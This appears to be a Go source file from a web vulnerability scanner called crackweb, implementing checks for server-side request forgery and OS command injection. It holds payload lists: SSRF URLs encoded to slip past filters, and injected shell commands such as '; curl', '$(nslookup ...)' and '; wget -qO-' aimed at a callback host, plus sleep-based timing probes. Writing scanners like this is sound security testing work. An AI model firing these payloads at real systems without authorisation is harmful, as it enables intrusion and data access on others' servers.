package active

import (
	"context"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// ssrfSeeds are the URL shapes a server-side fetch might accept. The callback
// address is substituted per attempt, so one seed covers a whole family of
// destinations.
var ssrfSeeds = []string{
	checks.CallbackURL,
	"http://" + checks.CallbackURL + "/",
	"https://" + checks.CallbackURL + "/",
	"//" + checks.CallbackURL + "/",
	checks.CallbackURL + "@example.com",
	"http://example.com@" + checks.CallbackURL + "/",
	"http://" + checks.CallbackURL + "/?url=" + checks.CallbackURL,
	// The same address, written as one number. A filter that blocks the dotted form has
	// blocked a spelling, not the address: one of these reaches the same callback.
	"http://" + checks.CallbackHostDecimal + "/?url=" + checks.CallbackURL,
	"http://" + checks.CallbackHostHex + "/?url=" + checks.CallbackURL,
	"dict://" + checks.CallbackURL + "/",
	"gopher://" + checks.CallbackURL + "/_",
	"ftp://" + checks.CallbackURL + "/",
}

// ssrf detects server-side request forgery by asking the target to fetch an
// address only crackweb's own listener can answer.
//
// This is the only way to find a blind SSRF: the response to the triggering
// request says nothing, and the proof arrives later, on a different connection.
// The variety in the seed list matters more than mutation here — a filter is far
// more likely to be missing a URL scheme than a character.
type ssrf struct{}

func (ssrf) ID() string                 { return "ssrf" }
func (ssrf) TitleKey() i18n.Key         { return i18n.KeyCheckSSRFTitle }
func (ssrf) DescriptionKey() i18n.Key   { return i18n.KeyCheckSSRFDesc }
func (ssrf) RemediationKey() i18n.Key   { return i18n.KeyCheckSSRFFix }
func (ssrf) Severity() finding.Severity { return finding.SeverityHigh }
func (ssrf) Tags() []string {
	return []string{"active", "injection", "ssrf", "owasp-top10"}
}
func (ssrf) Passive() bool { return false }

func (ssrf) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil || c.OOB == nil {
		return nil
	}
	c.ProbeWAF(ctx, t)

	attempt, err := c.ProbeOOB(ctx, t, "ssrf", ssrfSeeds, 0)
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(ssrf{}, t,
		i18n.KeyCheckSSRFTitle, i18n.KeyCheckSSRFDesc, i18n.KeyCheckSSRFFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-918"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
		"https://cwe.mitre.org/data/definitions/918.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Raw(), 4096)
	f.Evidence.Matches = []string{describeInteraction(c, attempt)}
	return []*finding.Finding{f}
}

// commandInjectionSeeds ask the target to resolve or fetch the callback address.
// Both are used because a target may be able to resolve names without being able
// to make outbound HTTP requests, or the other way round.
var commandInjectionSeeds = []string{
	"; nslookup " + checks.CallbackHost,
	"| nslookup " + checks.CallbackHost,
	"& nslookup " + checks.CallbackHost,
	"`nslookup " + checks.CallbackHost + "`",
	"$(nslookup " + checks.CallbackHost + ")",
	"; host " + checks.CallbackHost,
	"; ping -c 1 " + checks.CallbackHost,
	"; curl " + checks.CallbackURL,
	"| curl " + checks.CallbackURL,
	"& curl " + checks.CallbackURL,
	"`curl " + checks.CallbackURL + "`",
	"$(curl " + checks.CallbackURL + ")",
	"; wget -qO- " + checks.CallbackURL,
	"%0anslookup " + checks.CallbackHost,
	"'; nslookup " + checks.CallbackHost + " #",
}

// commandInjectionTimeSeeds make the shell sleep. They are the fallback for a
// target that cannot reach the internet at all.
var commandInjectionTimeSeeds = []string{
	"; sleep 3",
	"| sleep 3",
	"& sleep 3",
	"$(sleep 3)",
	"`sleep 3`",
	"%0asleep 3",
	"; ping -c 4 127.0.0.1",
}

// commandInjectionSleep is the pause the time-based seeds request; a response
// has to be at least this much slower than the baseline to count.
const commandInjectionSleep = 3 * time.Second

// commandInjection detects operating-system command injection, by callback where
// an out-of-band server is available and by timing where it is not.
type commandInjection struct{}

func (commandInjection) ID() string                 { return "command-injection" }
func (commandInjection) TitleKey() i18n.Key         { return i18n.KeyCheckCMDiTitle }
func (commandInjection) DescriptionKey() i18n.Key   { return i18n.KeyCheckCMDiDesc }
func (commandInjection) RemediationKey() i18n.Key   { return i18n.KeyCheckCMDiFix }
func (commandInjection) Severity() finding.Severity { return finding.SeverityCritical }
func (commandInjection) Tags() []string {
	return []string{"active", "injection", "rce", "owasp-top10"}
}
func (commandInjection) Passive() bool { return false }

func (commandInjection) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t.Param == nil || t.Response == nil {
		return nil
	}
	c.ProbeWAF(ctx, t)

	if c.OOB != nil {
		if findings := commandInjectionOOB(ctx, c, t); len(findings) > 0 {
			return findings
		}
	}
	return commandInjectionTiming(ctx, c, t)
}

// commandInjectionOOB asks the target to call back.
func commandInjectionOOB(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	attempt, err := c.ProbeOOB(ctx, t, "command-injection", commandInjectionSeeds, 0)
	if err != nil || attempt == nil {
		return nil
	}

	f := checks.NewFinding(commandInjection{}, t,
		i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
	f.Severity = finding.SeverityCritical
	f.Confidence = finding.ConfidenceCertain
	f.Payload = attempt.Variant.Value
	f.CWE = "CWE-78"
	f.References = []string{
		"https://owasp.org/www-community/attacks/Command_Injection",
		"https://cwe.mitre.org/data/definitions/78.html",
	}
	f.Evidence.Request = attempt.Request.Raw()
	f.Evidence.Response = truncate(attempt.Response.Raw(), 4096)
	f.Evidence.Matches = []string{describeInteraction(c, attempt)}
	return []*finding.Finding{f}
}

// commandInjectionTiming measures a pause, which works even when the target
// cannot reach the internet.
//
// It runs through the mutation engine, because a quote, a semicolon and the word
// sleep is about as recognisable as an attack gets — a filter that lets the
// plain payload through would not be doing its job. And like the SQL case, the
// verdict comes from repeated measurement rather than one stopwatch reading.
func commandInjectionTiming(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	for _, payloadText := range commandInjectionTimeSeeds {
		attempt, err := c.SendVariants(ctx, t, payload.Command, "command-injection-time",
			[]string{payloadText},
			func(_ *httpmsg.Request, resp *httpmsg.Response, _ payload.Variant) bool {
				return resp.Duration >= commandInjectionSleep/4
			})
		if err != nil || attempt == nil {
			continue
		}

		encoding := checks.EncodingForVariant(attempt.Variant)
		baseline, err := c.MeasureTiming(ctx, t, t.Param.Value, encoding, checks.DefaultTimingSamples)
		if err != nil {
			continue
		}
		injected, err := c.MeasureTiming(ctx, t, attempt.Variant.Value, encoding, checks.DefaultTimingSamples)
		if err != nil {
			continue
		}
		verdict := checks.JudgeTiming(baseline, injected, commandInjectionSleep)
		if !verdict.Delayed {
			continue
		}

		f := checks.NewFinding(commandInjection{}, t,
			i18n.KeyCheckCMDiTitle, i18n.KeyCheckCMDiDesc, i18n.KeyCheckCMDiFix)
		f.Severity = finding.SeverityHigh
		f.Confidence = finding.ConfidenceFirm
		f.Payload = attempt.Variant.Value
		f.CWE = "CWE-78"
		f.References = []string{"https://cwe.mitre.org/data/definitions/78.html"}
		f.Evidence.Request = attempt.Request.Raw()
		f.Evidence.Response = truncate(attempt.Response.Body, 4096)
		f.Evidence.Duration = verdict.Injected.Median
		f.Evidence.Matches = []string{
			c.Bundle.T(i18n.KeyEvidenceTimingStat,
				len(injected.Samples), ms(verdict.Injected.Median), ms(baseline.Median),
				ms(verdict.Injected.IQR), variantNote(c, attempt)),
		}
		return []*finding.Finding{f}
	}
	return nil
}

// describeInteraction renders the callback that proved an out-of-band finding.
func describeInteraction(c *checks.Context, attempt *checks.Attempt) string {
	if attempt == nil || len(attempt.Interactions) == 0 {
		return c.Bundle.T(i18n.KeyEvidenceOOB, "", "", "")
	}
	first := attempt.Interactions[0]
	return c.Bundle.T(i18n.KeyEvidenceOOB,
		strings.TrimSpace(first.Detail), first.Protocol, first.RemoteAddr)
}
